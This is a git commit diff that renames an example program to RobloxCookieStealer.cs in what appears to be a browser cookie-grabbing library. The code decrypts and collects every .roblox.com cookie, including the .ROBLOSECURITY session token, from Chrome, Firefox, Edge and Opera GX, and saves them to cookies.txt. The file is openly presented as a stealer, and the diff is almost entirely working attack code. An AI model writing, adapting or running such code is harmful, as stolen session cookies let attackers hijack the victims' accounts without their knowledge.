022fb2409d9de943c9d086ae2c30a28d94d1df4f
Official_Backdoor <61780641+TheBackdoor@users.noreply.github.com>
2020-12-23 00:09:18 +0100

    Update and rename RobloxGrabber.cs to RobloxCookieStealer.cs

--- Examples/RobloxCookieStealer.cs
+++ Examples/RobloxCookieStealer.cs
@@ -1,53 +1,46 @@
 using CockyGrabber;
 using System;
-namespace grabber
+namespace GrabberExamples
 {
     class Program
     {
         static void Main(string[] args)
         {
+            StringBuilder robloxCookies = new StringBuilder();
+            
             ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
             if (cg.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".roblox.com", cg.GetKey()))
                 {
-                    if (item.Name == (".ROBLOSECURITY"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (fg.CookiesExists())
             {
                 foreach (var item in fg.GetCookiesByHostname(".roblox.com"))
                 {
-                    if (item.Name == (".ROBLOSECURITY"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (eg.CookiesExists())
             {
                 foreach (var item in eg.GetCookiesByHostname(".roblox.com", eg.GetKey()))
                 {
-                    if (item.Name == (".ROBLOSECURITY"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
-                    
+                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (og.CookiesExists())
             {
                 foreach (var item in og.GetCookiesByHostname(".roblox.com", og.GetKey()))
                 {
-                    if (item.Name == (".ROBLOSECURITY"))
-                    {
-                        Console.WriteLine(item.Value + "\n");
-                    }
+                    robloxCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
+            
+            
+            File.WriteAllText("cookies.txt", robloxCookies.ToString());
+            Console.WriteLine("Cookies Grabbed and saved Successfully!");
             Console.ReadKey();
         }
     }
